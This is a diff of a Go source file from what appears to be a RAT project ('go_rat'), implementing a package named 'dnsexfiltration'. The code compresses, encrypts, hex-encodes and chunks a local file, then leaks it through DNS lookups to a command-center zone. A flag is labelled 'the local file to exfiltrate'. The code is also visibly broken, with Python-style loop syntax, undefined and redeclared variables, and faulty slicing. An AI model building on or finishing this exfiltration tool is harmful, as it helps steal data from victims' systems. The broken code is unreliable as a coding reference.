@@ -37,7 +37,7 @@ Messages should be small because:
 		this API does not allow it, but a protocol that uses excessive message sizes
 		might present some implementations with no other choice.
 
-	3. Fixed overheads will be sufficiently amortised by messages as small as 8KB.
+var	3. Fixed overheads will be sufficiently amortised by messages as small as 8KB.
 
 	4. Performance may be improved by working with messages that fit into data caches.
 		Thus large amounts of data should be chunked so that each message is small.
@@ -45,22 +45,26 @@ Messages should be small because:
 		chunk size.
 /*/
 
-package dnsexiltration
+package dnsexfiltration
 
 import (
 	"bytes"
 	"compress/zlib"
 	"crypto/rand"
+	"crypto/sha256"
 	"encoding/hex"
+	"flag"
 	"fmt"
 	"go_rat/pkg/shared_code/ErrorHandling"
 	"io"
-	"math/big"
 	"net"
 	"os"
 
-	"golang.org/x/crypto/salsa20"
+	"golang.org/x/crypto/chacha20poly1305"
 )
+
+// bytes per read operation
+var FILEREADSPEED int = 36
 
 // function to use zlib to compress a byte array
 func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
@@ -86,12 +90,16 @@ func ZDecompress(DataIn []byte) {
 	io.Copy(os.Stdout, r)
 	r.Close()
 }
+func OpenFile() {
+
+}
 
 // This function creates a nonce
 func NonceGenerator() (nonce []byte, derp error) {
 	//var n *big.Int
-	bitsize := big.NewInt(24)
-	nonce = make([]byte, 24)
+	//bitsize := big.NewInt(24)
+	//nonce = make([]byte, 24)
+	nonce := make([]byte, chacha20poly1305.NonceSizeX)
 	// make random 24 bit prime number
 	n, derp := rand.Int(rand.Reader, bitsize)
 	if derp != nil {
@@ -105,13 +113,13 @@ func NonceGenerator() (nonce []byte, derp error) {
 
 // makes chunky data for packet stuffing
 // chunk size known, number of packets unknown
-func DataChunkerChunkSize(DataIn []byte, chunkSize int) []byte { //, derp error) {
-	var chunkcount int = 1
+func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp error) {
+	//var chunkcount int = 1
 	var DataInLength = len(DataIn)
 	// make the buffer
-	DataOutBuffer := make([]byte, DataInLength)
+	DataOutBuffer := make([][]byte, DataInLength)
 	// loop over the original data object taking a bite outta crim... uh data
-	for asdf := 1; chunkcount < DataInLength; chunkcount += chunkSize { //chunkcount++{
+	for asdf := 1; asdf < DataInLength; asdf += chunkSize { //chunkcount++{
 		// mark the end bounds
 		//asdf= 2 ; end = 52? wat
 		end := asdf + chunkSize
@@ -120,7 +128,7 @@ func DataChunkerChunkSize(DataIn []byte, chunkSize int) []byte { //, derp error)
 		if end > DataInLength {
 			end = DataInLength
 		}
-		DataOutBuffer = append(DataOutBuffer, DataIn[:chunkSize])
+		DataOutBuffer = append(DataOutBuffer, DataIn[asdf:chunkSize])
 
 	}
 
@@ -133,14 +141,44 @@ func DataChunkerChunkSize(DataIn []byte, chunkSize int) []byte { //, derp error)
 func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Salsa []byte, derp error) {
 	var key [32]byte
 	out := make([]byte, len(bytes_in))
-	///now we figure out the key
-
 	if derp != nil {
 		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 	}
 	// I was advised not to make my own unless I was a professional mathermind
 	// this is the easy cheater way, use someone elses work
-	salsa20.XORKeyStream(out, in, nonce, &key)
+
+	pass := "Hello"
+	msg := "Pass"
+
+	argCount := len(os.Args[1:])
+
+	if argCount > 0 {
+		msg = string(os.Args[1])
+	}
+	if argCount > 1 {
+		pass = string(os.Args[2])
+	}
+
+	key := sha256.Sum256([]byte(pass))
+	aead, _ := chacha20poly1305.NewX(key[:])
+
+	if pass == "" {
+		a := make([]byte, 32)
+		copy(key[:32], a[:32])
+		aead, _ = chacha20poly1305.NewX(a)
+	}
+	if msg == "" {
+		a := make([]byte, 32)
+		msg = string(a)
+
+	}
+
+	nonce := make([]byte, chacha20poly1305.NonceSizeX)
+
+	ciphertext := aead.Seal(nil, nonce, []byte(msg), nil)
+
+	plaintext, _ := aead.Open(nil, nonce, ciphertext, nil)
+
 	copy(Salsa, out)
 	for _, element := range out {
 		// original code treated this like a nullbyte but wat?
@@ -151,7 +189,7 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Sals
 	}
 	return Salsa, derp
 }
-func sendDNSmessage(MsgAsHexStr string, DestZone string) (herp, derp error) {
+func sendDNSmessage(MsgAsHexStr string, DestZone string) {
 	var debug bool = true
 	//a unique marker to identify the file in the dns logs
 	var marker string = "herpAderpNotAPerp"
@@ -159,12 +197,14 @@ func sendDNSmessage(MsgAsHexStr string, DestZone string) (herp, derp error) {
 	hostname := fmt.Sprintf("%d.%s.1.%s.%s", marker, MsgAsHexStr, DestZone)
 	herp, derp := net.LookupIP(hostname)
 	fmt.Printf("%d\n", chunk)
-	if *debug {
-		fmt.Printf("Data Inside Hostname: %s\n", hostname)
-		fmt.Printf("Data Length: %d\n", len(hostname))
+	if debug {
+		fmt.Printf("Data Length: %d\n")
 		fmt.Printf("Error: %s\n", derp)
 		fmt.Printf("--------------------------\n")
 	}
+
+}
+func DnsReceiver() {
 
 }
 
@@ -175,27 +215,29 @@ func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (he
 	//var debug bool = true
 	//the local file to exfiltrate.
 	//var file []byte = ByteArrayInput
-	//a unique marker to identify the message in the dns logs
-	//var marker string = "herpAderpNotAPerp"
 	// the dns zone to send the queries to.
 	DestZone = ""
 	MaxMsgSize = 512 // bytes
-	// 90 bytes wide, thats the number given by the original source...
-	// Which doesnt make sense? the final structure to fit this into only
-	// allows :
-	// Length: Each label can theoretically be from 0 to 63 characters in
-	//	 length. In practice, a length of 1 to about 20 characters is most
-	//	 common, with a special exception for the label assigned to the
-	//	 root of the tree (see below).
-	DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)
-	message_array_capacity = cap(dataBytes)
-	dataBytes = dataBytes[:cap(message_array_capacity)]
-	bytesRead, err := f.Read(dataBytes)
+	chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)
 
-	dataBytes = dataBytes[:bytesRead]
-	hexString := hex.EncodeToString(dataBytes)
-
-	if len(hexString) > 60 && len(hexString) <= 120 {
+	for thing in chunksofdata {
+		hexString := hex.EncodeToString(dataBytes)
 		sendDNSmessage(hexString, DestZone)
+	}
+
+}
+
+func main() {
+	var debug = flag.Bool("d", false, "enable debugging.")
+	var file = flag.String("file", "", "the local file to exfiltrate.")
+	var help = flag.Bool("help", false, "show help.")
+	var DerpKey = flag.String("key", "Herp-Key-Derp")
+	var CommandCenter = flag.String("Command Center", "hakcbiscuits.firewall-gateway.netyinski", "the dns zone (homebase) to send the queries to.")
+
+	flag.Parse()
+
+	if *help || len(os.Args) == 1 {
+		flag.PrintDefaults()
+		return
 	}
 }
